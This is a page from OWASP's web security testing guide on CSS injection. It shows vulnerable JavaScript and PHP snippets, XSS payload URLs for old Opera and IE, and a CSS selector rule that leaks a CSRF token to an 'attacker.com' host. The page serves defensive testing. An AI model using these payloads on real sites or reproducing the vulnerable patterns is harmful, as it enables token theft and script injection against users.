# Testing for CSS Injection

|ID          |
|------------|
|WSTG-CLNT-05|

## Summary

A CSS Injection vulnerability involves the ability to inject arbitrary CSS code in the context of a trusted web site which is rendered inside a victim's browser. The impact of this type of vulnerability varies based on the supplied CSS payload. It may lead to cross site scripting or data exfiltration.

This vulnerability occurs when the application allows user-supplied CSS to interfere with the application's legitimate style sheets. Injecting code in the CSS context may provide an attacker with the ability to execute JavaScript in certain conditions, or to extract sensitive values using CSS selectors and functions able to generate HTTP requests. Generally, allowing users the ability to customize pages by supplying custom CSS files is a considerable risk.

The following JavaScript code shows a possible vulnerable script in which the attacker is able to control the `location.hash` (source) which reaches the `cssText` function (sink). This particular case may lead to DOM-based XSS in older browser versions; for more information, see the [DOM-based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).

```html
<a id="a1">Click me</a>
<script>
    if (location.hash.slice(1)) {
    document.getElementById("a1").style.cssText = "color: " + location.hash.slice(1);
    }
</script>
```

The attacker could target the victim by asking them to visit the following URLs:

- `www.victim.com/#red;-o-link:'<javascript:alert(1)>';-o-link-source:current;` (Opera \[8,12\])
- `www.victim.com/#red;-:expression(alert(URL=1));` (IE 7/8)

The same vulnerability may appear in the case of reflected XSS, for example, in the following PHP code:

```html
<style>
p {
    color: <?php echo $_GET['color']; ?>;
    text-align: center;
}
</style>
```

Further attack scenarios involve the ability to extract data through the adoption of pure CSS rules. Such attacks can be conducted through CSS selectors, leading to the exfiltration of data, for example, CSRF tokens.

Here is an example of code that attempts to select an input with a `name` matching `csrf_token` and a `value` beginning with an `a`. By utilizing a brute-force attack to determine the attribute's `value`, it is possible to carry out an attack that sends the value to the attacker's domain, such as by attempting to set a background image on the selected input element.

```html
<style>
input[name=csrf_token][value=^a] {
    background-image: url(http://attacker.com/log?a);
}
</style>
```

Other attacks using solicited content such as CSS are highlighted in [Mario Heiderich's talk, "Got Your Nose"](https://www.youtube.com/watch?v=FIQvAaZj_HA) on YouTube.

## Test Objectives

- Identify CSS injection points.
- Assess the impact of the injection.

## How to Test

Code should be analyzed to determine if a user is permitted to inject content in the CSS context. Particularly, the way in which the website returns CSS rules on the basis of the inputs should be inspected.

The following is a basic example:

```html
<a id="a1">Click me</a>
<b>Hi</b>
<script>
    $("a").click(function(){
        $("b").attr("style","color: " + location.hash.slice(1));
    });
</script>
```

The above code contains a source `location.hash`, controlled by the attacker, that can inject directly in the `style` attribute of an HTML element. As mentioned above, this may lead to different results depending on the browser in use and the supplied payload.

The following pages provide examples of CSS injection vulnerabilities:

- [Password "cracker" via CSS and HTML5](http://html5sec.org/invalid/?length=25)
- [CSS attribute reading](http://eaea.sirdarckcat.net/cssar/v2/)
- [JavaScript based attacks using `CSSStyleDeclaration` with unescaped input](https://github.com/wisec/domxsswiki/wiki/CSS-Text-sink)

For further OWASP resources on preventing CSS injection, see the [Securing Cascading Style Sheets Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Securing_Cascading_Style_Sheets_Cheat_Sheet.html).
